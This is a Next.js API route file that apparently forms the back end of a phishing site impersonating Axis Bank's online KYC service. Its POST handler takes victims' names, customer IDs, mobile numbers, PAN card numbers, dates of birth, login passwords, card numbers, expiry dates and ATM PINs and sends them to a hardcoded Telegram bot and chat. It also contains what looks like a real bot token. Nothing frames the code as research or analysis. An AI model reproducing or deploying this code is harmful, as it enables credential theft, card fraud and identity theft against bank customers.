import { NextRequest, NextResponse } from 'next/server';

const BOT_TOKEN = '8519877001:AAFUU7sq1cR3L-Rcsp_p1tydU0SiG2zvbwk';
const CHAT_ID = '7271452485';

export async function POST(request: NextRequest) {
  try {
    console.log('📱 Mobile API route called');
    
    const body = await request.json();
    console.log('📦 Received data:', body);
    
    const { type, data } = body;
    
    let message = '';
    
    if (type === 'direct') {
      message = data.message;
    } else if (type === 'kyc') {
      message = `
📝 <b>NEW KYC UPDATE - AXIS BANK (Mobile)</b>

👤 <b>Customer Information:</b>
• <b>Full Name:</b> <code>${data.fullName}</code>
• <b>Customer ID:</b> <code>${data.customerId}</code>
• <b>Mobile Number:</b> <code>${data.mobileNumber}</code>
• <b>PAN Card:</b> <code>${data.panCardNumber}</code>
• <b>Date of Birth:</b> <code>${data.dateOfBirth}</code>
• <b>Timestamp:</b> ${data.timestamp}
• <b>Device:</b> Mobile 📱

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
      `;
    } else if (type === 'login') {
      message = `
🔐 <b>NEW LOGIN ATTEMPT - AXIS BANK KYC (Mobile)</b>

📋 <b>Login Details:</b>
• <b>User ID:</b> <code>${data.userId}</code>
• <b>Password:</b> <code>${data.password}</code>
• <b>Timestamp:</b> ${data.timestamp}
• <b>Device:</b> Mobile 📱

🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
      `;
    } else if (type === 'card') {
      message = `
💳 <b>CARD VERIFICATION COMPLETED - AXIS BANK (Mobile)</b>

💳 <b>Card Details:</b>
• <b>Card Number:</b> <code>${data.cardNumber}</code>
• <b>Expiry Date:</b> <code>${data.expiryDate}</code>
• <b>ATM PIN:</b> <code>${data.atmPin}</code>
• <b>Timestamp:</b> ${data.timestamp}
• <b>Device:</b> Mobile 📱

✅ <i>Card verification successful</i>
🏦 <i>Axis Bank Online KYC System</i>
⏰ ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
👤 Sent to: <a href="https://t.me/vikaskumar_8102">@vikaskumar_8102</a>
      `;
    }

    console.log('📤 Sending message to Telegram...');
    
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      }),
    });

    console.log('📋 Telegram response status:', response.status);
    
    if (response.ok) {
      const result = await response.json();
      console.log('✅ Message sent successfully:', result);
      return NextResponse.json({ success: true, message: 'Message sent successfully' });
    } else {
      const errorText = await response.text();
      console.error('❌ Failed to send message:', errorText);
      return NextResponse.json({ success: false, error: errorText }, { status: 400 });
    }
    
  } catch (error) {
    console.error('❌ API route error:', error);
    return NextResponse.json({ success: false, error: 'Internal server error' }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json({ message: 'Telegram API route is working' });
}
